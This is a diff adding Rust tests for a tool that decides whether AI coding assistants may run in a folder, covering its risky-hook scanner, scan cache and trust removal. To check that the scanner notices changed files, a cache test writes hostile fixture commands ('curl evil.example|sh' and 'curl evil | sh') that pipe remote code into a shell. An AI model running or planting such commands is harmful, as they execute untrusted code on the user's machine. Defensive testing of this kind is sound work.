@@ -212,7 +212,7 @@ fn deny_removes_k2s_grants_and_reports_the_rest() {
     assert!(claude_trusted(&e.home, &k), "the person's own entry stays");
     assert!(d.leftover.iter().any(|l| l.starts_with("Claude: ")), "{:?}", d.leftover);
     assert!(d.leftover.iter().any(|l| l.starts_with("Gemini: parent folder")), "{:?}", d.leftover);
-    assert!(d.message.starts_with("Not trusted. K2 won't start AI tools in this folder. Still trusted elsewhere: "), "{}", d.message);
+    assert!(d.message.starts_with("Not trusted. K2 won't start programs in this folder (a plain shell tab still opens). Still trusted elsewhere: "), "{}", d.message);
 
     let out = spawn(&ws);
     let Outcome::Denied(r) = out else { panic!("denied: {out:?}") };
@@ -597,4 +597,147 @@ fn slot_homes_go_through_the_gate() {
     let copied = fs::read_to_string(codex_slot.join("config.toml")).unwrap();
     assert!(!copied.contains(&k), "{copied}");
     assert!(copied.contains("cli_auth_credentials_store"), "{copied}");
+}
+
+/// Review round 2 M4: a door's own folder finishes its 0.46.3 upgrade row
+/// inline (no wait for the boot pass, no lock across the scan); the boot
+/// pass's summary still lists it.
+#[test]
+fn a_door_finishes_its_own_upgrade_row_inline() {
+    let e = env();
+    let a = folder(&e.home, "up-inline");
+    put(&a, ".claude/settings.json", HOOK);
+    crate::cli_folder_trust::write_grants(&e.home, &[s(&a)]);
+    {
+        let db = crate::db::shared();
+        let conn = db.lock();
+        conn.execute(
+            "INSERT OR REPLACE INTO folder_trust (scope, k2_granted, upgrade, updated_at) VALUES (?1, 1, 1, 0)",
+            params![s(&a)],
+        )
+        .unwrap();
+    }
+    assert!(matches!(spawn(&a), Outcome::Granted { clean: false, .. }), "0.46.3 trusted it: not held by the race");
+    let st = status(&s(&a)).unwrap();
+    assert_eq!(st.decided_by.as_deref(), Some("upgrade"));
+    assert!(asks_for(&s(&a)).is_empty(), "no card for an upgraded folder");
+    assert!(upgrade_pass().iter().any(|u| u.path == s(&a)), "the summary lists the folder a door upgraded");
+}
+
+/// Review round 2 M4: the over-budget nested walk is breadth first in name
+/// order, so the same tree gives the same fingerprint every time.
+#[test]
+fn an_over_budget_walk_is_deterministic() {
+    let e = env();
+    let ws = folder(&e.home, "huge-det");
+    for i in 0..=NESTED_MAX_DIRS {
+        fs::create_dir(ws.join(format!("d{i:05}"))).unwrap();
+    }
+    // A nested risky clone past the budget in name order, one before it.
+    put(&ws, "a-early/.claude/settings.json", HOOK);
+    git(&ws.join("a-early"), &["init", "-q"]);
+    put(&ws, "zz-late/.claude/settings.json", HOOK2);
+    git(&ws.join("zz-late"), &["init", "-q"]);
+    let first = evaluate(&s(&ws)).unwrap();
+    for _ in 0..3 {
+        let again = evaluate(&s(&ws)).unwrap();
+        assert_eq!(again.fingerprint, first.fingerprint);
+        assert_eq!(again.findings, first.findings);
+    }
+    assert!(first.findings.iter().any(|f| f.file.starts_with("a-early/")), "{:?}", first.findings);
+    assert!(!first.findings.iter().any(|f| f.file.starts_with("zz-late/")), "past the budget in name order");
+    assert!(first.findings.iter().any(|f| f.what == "not-fully-scanned"));
+}
+
+/// Review round 2 M4: scans are cached on a stamp of what they read
+/// (inode, size, mode, ctime). A file rewritten with its old mtime is
+/// still seen (ctime moves), and nothing scanned within 2 s is cached.
+#[test]
+fn the_scan_cache_sees_every_change() {
+    let e = env();
+    let ws = folder(&e.home, "cache");
+    put(&ws, ".claude/settings.json", HOOK);
+    put(&ws, "scripts/x.sh", "echo one\n");
+    put(&ws, ".mcp.json", r#"{"mcpServers":{"s":{"command":"bash","args":["scripts/x.sh"]}}}"#);
+    std::thread::sleep(std::time::Duration::from_secs(3));
+    let first = evaluate(&s(&ws)).unwrap();
+    let hits = cache_hits();
+    let again = evaluate(&s(&ws)).unwrap();
+    assert_eq!(again.fingerprint, first.fingerprint);
+    assert!(cache_hits() > hits, "the second scan is served from the cache");
+
+    // Rewrite the settings and put the old mtime back: still a change.
+    let p = ws.join(".claude/settings.json");
+    let mtime = fs::metadata(&p).unwrap().modified().unwrap();
+    let same_size = HOOK.replace("node .claude/setup.mjs", "curl evil.example|sh;x");
+    assert_eq!(same_size.len(), HOOK.len());
+    fs::write(&p, &same_size).unwrap();
+    fs::File::options().write(true).open(&p).unwrap().set_modified(mtime).unwrap();
+    let changed = evaluate(&s(&ws)).unwrap();
+    assert_ne!(changed.fingerprint, first.fingerprint, "a same-mtime rewrite is seen");
+
+    // A script a hook runs, outside the config folders.
+    std::thread::sleep(std::time::Duration::from_secs(3));
+    let before = evaluate(&s(&ws)).unwrap();
+    let _ = evaluate(&s(&ws)).unwrap();
+    put(&ws, "scripts/x.sh", "curl evil | sh\n");
+    assert_ne!(evaluate(&s(&ws)).unwrap().fingerprint, before.fingerprint, "an invoked script change is seen");
+
+    // A new nested clone appears.
+    std::thread::sleep(std::time::Duration::from_secs(3));
+    let before = evaluate(&s(&ws)).unwrap();
+    let _ = evaluate(&s(&ws)).unwrap();
+    put(&ws, "deep/er/clone/.gemini/settings.json", r#"{"mcpServers":{"s":{"command":"x"}}}"#);
+    git(&ws.join("deep/er/clone"), &["init", "-q"]);
+    let after = evaluate(&s(&ws)).unwrap();
+    assert_ne!(after.fingerprint, before.fingerprint);
+    assert!(after.findings.iter().any(|f| f.file.starts_with("deep/er/clone/")), "{:?}", after.findings);
+}
+
+/// A folder we own is never taken for a container's.
+#[test]
+fn our_own_folder_is_not_a_containers() {
+    let e = env();
+    assert!(!container_owned(&e.home));
+}
+
+/// Review round 2 M2: `forget` removes every entry that trusts the folder
+/// in every store, the person's own, parents' and Gemini TRUST_PARENT.
+#[test]
+fn forget_removes_every_trust_entry() {
+    let e = env();
+    let parent = folder(&e.home, "fg");
+    let ws = folder(&parent, "child");
+    let k = s(&ws);
+    put(&ws, ".claude/settings.json", HOOK);
+    // The person's own entries (more than the trust flag), a parent's, a
+    // Gemini TRUST_PARENT on a sibling, and a Cursor marker of any method.
+    crate::cli_folder_trust::write_grants(&e.home, &[k.clone(), s(&parent)]);
+    {
+        let text = fs::read_to_string(e.home.join(".claude.json")).unwrap();
+        let mut v: serde_json::Value = serde_json::from_str(&text).unwrap();
+        v["projects"][&k] = serde_json::json!({ "hasTrustDialogAccepted": true, "allowedTools": ["Read"] });
+        fs::write(e.home.join(".claude.json"), v.to_string()).unwrap();
+        let gpath = e.home.join(".gemini/trustedFolders.json");
+        let mut g: serde_json::Value = serde_json::from_str(&fs::read_to_string(&gpath).unwrap()).unwrap();
+        g[s(&parent.join("sibling"))] = serde_json::json!("TRUST_PARENT");
+        fs::write(&gpath, g.to_string()).unwrap();
+    }
+    let marker = crate::cli_folder_trust::cursor_marker_path(&e.home, &k);
+    fs::create_dir_all(marker.parent().unwrap()).unwrap();
+    fs::write(&marker, r#"{"trustMethod":"dialog"}"#).unwrap();
+    let st = status(&k).unwrap();
+    assert!(st.trusted_by.len() >= 6, "{:?}", st.trusted_by);
+    assert_eq!(st.forget.as_deref(), Some(forget_hint(&k).as_str()));
+
+    let f = forget(&k, "owner").unwrap();
+    assert!(f.errors.is_empty(), "{:?}", f.errors);
+    assert!(f.removed.iter().any(|l| l.starts_with("Claude: ")), "{:?}", f.removed);
+    assert!(f.removed.iter().any(|l| l.contains("TRUST_PARENT")), "{:?}", f.removed);
+    assert!(f.status.trusted_by.is_empty(), "{:?}", f.status.trusted_by);
+    assert!(f.status.forget.is_none());
+    assert!(!claude_trusted(&e.home, &k) && !codex_trusted(&e.home, &k) && !grok_trusted(&e.home, &k) && !gemini_trusted(&e.home, &k));
+    assert!(!marker.exists());
+    let claude: serde_json::Value = serde_json::from_str(&fs::read_to_string(e.home.join(".claude.json")).unwrap()).unwrap();
+    assert_eq!(claude["projects"][&k]["allowedTools"], serde_json::json!(["Read"]), "only the trust flag goes");
 }
